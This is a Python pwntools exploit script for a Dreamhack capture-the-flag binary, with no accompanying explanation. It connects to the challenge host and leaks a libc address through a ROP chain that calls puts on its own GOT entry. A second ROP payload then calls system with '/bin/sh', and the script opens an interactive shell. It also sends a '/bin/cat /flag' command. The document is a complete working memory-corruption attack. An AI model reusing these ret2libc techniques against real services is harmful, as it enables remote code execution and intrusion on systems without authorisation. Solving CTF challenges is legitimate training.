from pwn import *
context.update(arch='amd64', os='linux')
context.binary = exe = ELF('./prob_patched')
#p = process(exe.path, env={'LD_PRELOAD': './libc.so.6'})
# p = process("./prob")
libc = ELF("./libc.so.6")
p = remote('host1.dreamhack.games', 12399)

p.sendafter(b"> ",b'Decision2Solve\x00\x00')

safe_addr = 0x404010
main_addr = 0x401446
p.send(p64(safe_addr))
p.send(p32(main_addr) + b'\x00\x00')
input()
p.sendafter(b'> ',b'1')
i = 0
while True:
    if(i==1000):
        break
    p.sendafter(b'> ',b'a'*0x10)
    p.sendafter(b'> ',b'1')
    i+=1
    print(f"i: {i}")

p.sendafter(b'> ',b"/bin/cat /flag\x00\x00")
p.sendafter(b'> ',b'2')

pop_rdi_rbp = 0x000000000040129b
puts_got = exe.got.puts
puts_plt = exe.plt.puts

payload = b'a'*32 + p64(0)
payload += p64(pop_rdi_rbp)
payload += p64(puts_got) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(exe.sym.unsafe_func)
payload = payload.ljust(0x10000,b'a')
p.send(payload)

libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym.puts
log.info(f"libc: {hex(libc.address)}")

payload2 = p64(next(libc.search(b'/bin/sh\x00')))*5 
payload2 += p64(libc.address + 0x00000000000f99ab)*5
payload2 += p64(libc.address + 0x000000000002a745)
payload2 += p64(next(libc.search(b'/bin/sh\x00'))) + p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(libc.sym.system)
payload2 += p64(0x00000000004012FB) #exit
payload2 = payload2.ljust(0x10000,b'\x00')
sleep(1)
input()
p.send(payload2)



p.interactive()
